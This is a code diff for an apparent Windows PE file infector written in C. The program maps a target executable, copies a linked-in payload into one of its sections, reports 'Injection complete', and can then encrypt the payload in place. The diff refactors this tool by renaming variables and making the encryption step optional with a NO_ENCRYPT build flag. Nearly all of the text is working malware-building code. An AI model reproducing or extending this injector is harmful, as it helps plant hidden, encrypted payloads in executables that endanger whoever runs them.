@@ -1,10 +1,13 @@
 #include <Windows.h>
 #include <stdio.h>
 #include <string.h>
-#include "encrypt.hpp"
-#include "libaes.h"
 #include "payload.h"
 #include "utils.h"
+
+#ifndef NO_ENCRYPT
+#include "encrypt.hpp"
+#include "libaes.h"
+#endif  // NO_ENCRYPT
 
 int main(int argc, char* argv[]) {
     int ret = 0;
@@ -21,12 +24,14 @@ int main(int argc, char* argv[]) {
     PIMAGE_DOS_HEADER pDosHeaderRW;
     PIMAGE_NT_HEADERS64 pNtHeaderRW;
     PIMAGE_SECTION_HEADER pSectionRW, pLastSectionRW;
-    PBYTE pPayloadData;
-    SSIZE_T sszPayloadEncOffset;
+    PBYTE pPayloadDest;
     WORD wNbSections;
 #ifndef SKIP_SIGN
     DWORD dwSignature;
 #endif  // SKIP_SIGN
+#ifndef NO_ENCRYPT
+    SSIZE_T sszPayloadEncOffset;
+#endif  // NO_ENCRYPT
 
     CONST DWORD dwPayloadSize = (DWORD)((PCBYTE)&__payload_end - (PCBYTE)&__payload_start);
     printf("Payload size: %lu\n", dwPayloadSize);
@@ -202,12 +207,13 @@ int main(int argc, char* argv[]) {
     printf("New payload:\n");
     HexDump(&__payload_start, dwPayloadSize);
 
-    pPayloadData = (PBYTE)pDosHeaderRW + dwPayloadPtr;
+    pPayloadDest = (PBYTE)pDosHeaderRW + dwPayloadPtr;
 
-    memcpy(pPayloadData, &__payload_start, dwPayloadSize);
+    memcpy(pPayloadDest, &__payload_start, dwPayloadSize);
 
     printf("[*] Injection complete!\n");
 
+#ifndef NO_ENCRYPT
     printf("[*] Encrypting payload...\n");
     sszPayloadEncOffset = &__payload_enc_start - &__payload_start;
     printf("Encrypted payload offset: %#llx\n", sszPayloadEncOffset);
@@ -217,14 +223,14 @@ int main(int argc, char* argv[]) {
         goto unmap;
     }
 
-    if (EncryptPayload(pPayloadData + sszPayloadEncOffset, dwPayloadSize - sszPayloadEncOffset)) {
+    if (EncryptPayload(pPayloadDest + sszPayloadEncOffset, dwPayloadSize - sszPayloadEncOffset)) {
         ret = 1;
         goto unmap;
     }
 
     printf("[*] Done!\n");
-
-    // HexDump(pPayloadData, dwPayloadSize);
+    // HexDump(pPayloadDest, dwPayloadSize);
+#endif  // NO_ENCRYPT
 
     FlushViewOfFile(pMapAddress, 0);
 unmap:
